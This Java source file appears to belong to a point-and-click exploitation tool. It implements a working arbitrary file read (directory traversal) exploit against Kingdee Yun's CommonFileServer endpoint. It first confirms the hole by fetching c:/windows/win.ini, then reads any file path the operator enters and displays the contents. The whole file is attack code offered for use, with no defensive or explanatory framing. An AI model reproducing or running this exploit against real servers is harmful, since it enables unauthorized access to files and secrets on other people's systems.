package exp.oa.kingdeeoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class kingdee_Yun_CommonFileServer_FileRead implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/CommonFileServer/c:/windows/win.ini" , head, "utf-8");
            if (get_res.getCode() == 200 && !get_res.getText().isEmpty()) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ kingdee_CommonFileServer_FileRead ]");
                    textArea.appendText("\n 目录遍历页面: "+url + "/CommonFileServer/c:/windows/win.ini");
                    textArea.appendText("\n CMD处设置读取文件例如: c:/windows/win.ini");
                    textArea_cmd.appendText("\n "+get_res.getText());
                    textArea.appendText("\n ");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String pwd,TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/CommonFileServer/"+pwd , head, "utf-8");
            if (get_res.getCode() == 200 && !get_res.getText().isEmpty()) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 目录遍历页面: "+url + "/CommonFileServer/"+pwd);
                    textArea.appendText("\n 文件读取成功");
                    textArea_cmd.appendText("\n "+get_res.getText());
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n 文件读取失败");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
